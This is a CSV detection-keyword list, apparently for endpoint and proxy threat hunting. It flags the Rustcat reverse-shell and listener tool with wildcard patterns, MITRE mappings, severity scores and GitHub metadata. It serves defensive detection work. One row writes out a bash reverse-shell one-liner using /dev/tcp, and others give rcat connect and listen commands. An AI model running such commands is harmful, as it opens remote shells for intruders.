"keyword","metadata_keyword_regex","metadata_keyword_type","metadata_tool","metadata_description","metadata_tool_techniques","metadata_tool_tactics","metadata_malwares_name","metadata_groups_name","metadata_category","metadata_link","metadata_enable_endpoint_detection","metadata_enable_proxy_detection","metadata_comment","metadata_severity_score","metadata_popularity_score","metadata_github_stars","metadata_github_forks","metadata_github_updated_at","metadata_github_created_at"
"*/bin/bash -c 'bash -i >& /dev/tcp/*/* 0>&1'*","N/A","offensive_tool_keyword","rustcat","Rustcat(rcat) - The modern Port listener and Reverse shell","T1090.001 - T1090.002 - T1046","TA0011 - TA0009 - TA0040","N/A","N/A","C2","https://github.com/robiot/rustcat","1","0","N/A","10","10","592","58","2023-10-02T11:32:12Z","2021-06-04T17:03:47Z"
"*/rcat-v*-win-x86_64.exe*","N/A","offensive_tool_keyword","rustcat","Rustcat(rcat) - The modern Port listener and Reverse shell","T1090.001 - T1090.002 - T1046","TA0011 - TA0009 - TA0040","N/A","N/A","C2","https://github.com/robiot/rustcat","1","1","N/A","10","10","592","58","2023-10-02T11:32:12Z","2021-06-04T17:03:47Z"
"*/rustcat/releases/latest/download/*","N/A","offensive_tool_keyword","rustcat","Rustcat(rcat) - The modern Port listener and Reverse shell","T1090.001 - T1090.002 - T1046","TA0011 - TA0009 - TA0040","N/A","N/A","C2","https://github.com/robiot/rustcat","1","1","N/A","10","10","592","58","2023-10-02T11:32:12Z","2021-06-04T17:03:47Z"
"*/src/unixshell.rs*","N/A","offensive_tool_keyword","rustcat","Rustcat(rcat) - The modern Port listener and Reverse shell","T1090.001 - T1090.002 - T1046","TA0011 - TA0009 - TA0040","N/A","N/A","C2","https://github.com/robiot/rustcat","1","1","N/A","10","10","592","58","2023-10-02T11:32:12Z","2021-06-04T17:03:47Z"
"*\rcat-v*-win-x86_64.exe*","N/A","offensive_tool_keyword","rustcat","Rustcat(rcat) - The modern Port listener and Reverse shell","T1090.001 - T1090.002 - T1046","TA0011 - TA0009 - TA0040","N/A","N/A","C2","https://github.com/robiot/rustcat","1","0","N/A","10","10","592","58","2023-10-02T11:32:12Z","2021-06-04T17:03:47Z"
"*B473B9A4135DE247C6D76510B40F63F8F1E5A2AB*","N/A","offensive_tool_keyword","rustcat","Rustcat(rcat) - The modern Port listener and Reverse shell","T1090.001 - T1090.002 - T1046","TA0011 - TA0009 - TA0040","N/A","N/A","C2","https://github.com/robiot/rustcat","1","0","N/A","10","10","592","58","2023-10-02T11:32:12Z","2021-06-04T17:03:47Z"
"*blackarch/tree/master/packages/rustcat*","N/A","offensive_tool_keyword","rustcat","Rustcat(rcat) - The modern Port listener and Reverse shell","T1090.001 - T1090.002 - T1046","TA0011 - TA0009 - TA0040","N/A","N/A","C2","https://github.com/robiot/rustcat","1","1","N/A","10","10","592","58","2023-10-02T11:32:12Z","2021-06-04T17:03:47Z"
"*pacman -S rustcat*","N/A","offensive_tool_keyword","rustcat","Rustcat(rcat) - The modern Port listener and Reverse shell","T1090.001 - T1090.002 - T1046","TA0011 - TA0009 - TA0040","N/A","N/A","C2","https://github.com/robiot/rustcat","1","0","N/A","10","10","592","58","2023-10-02T11:32:12Z","2021-06-04T17:03:47Z"
"*rcan listen -ib *","N/A","offensive_tool_keyword","rustcat","Rustcat(rcat) - The modern Port listener and Reverse shell","T1090.001 - T1090.002 - T1046","TA0011 - TA0009 - TA0040","N/A","N/A","C2","https://github.com/robiot/rustcat","1","0","N/A","10","10","592","58","2023-10-02T11:32:12Z","2021-06-04T17:03:47Z"
"*rcat c -s bash *","N/A","offensive_tool_keyword","rustcat","Rustcat(rcat) - The modern Port listener and Reverse shell","T1090.001 - T1090.002 - T1046","TA0011 - TA0009 - TA0040","N/A","N/A","C2","https://github.com/robiot/rustcat","1","0","N/A","10","10","592","58","2023-10-02T11:32:12Z","2021-06-04T17:03:47Z"
"*rcat connect -s bash*","N/A","offensive_tool_keyword","rustcat","Rustcat(rcat) - The modern Port listener and Reverse shell","T1090.001 - T1090.002 - T1046","TA0011 - TA0009 - TA0040","N/A","N/A","C2","https://github.com/robiot/rustcat","1","0","N/A","10","10","592","58","2023-10-02T11:32:12Z","2021-06-04T17:03:47Z"
"*rcat listen 55660*","N/A","offensive_tool_keyword","rustcat","Rustcat(rcat) - The modern Port listener and Reverse shell","T1090.001 - T1090.002 - T1046","TA0011 - TA0009 - TA0040","N/A","N/A","C2","https://github.com/robiot/rustcat","1","0","N/A","10","10","592","58","2023-10-02T11:32:12Z","2021-06-04T17:03:47Z"
"*rcat listen -ie *","N/A","offensive_tool_keyword","rustcat","Rustcat(rcat) - The modern Port listener and Reverse shell","T1090.001 - T1090.002 - T1046","TA0011 - TA0009 - TA0040","N/A","N/A","C2","https://github.com/robiot/rustcat","1","0","N/A","10","10","592","58","2023-10-02T11:32:12Z","2021-06-04T17:03:47Z"
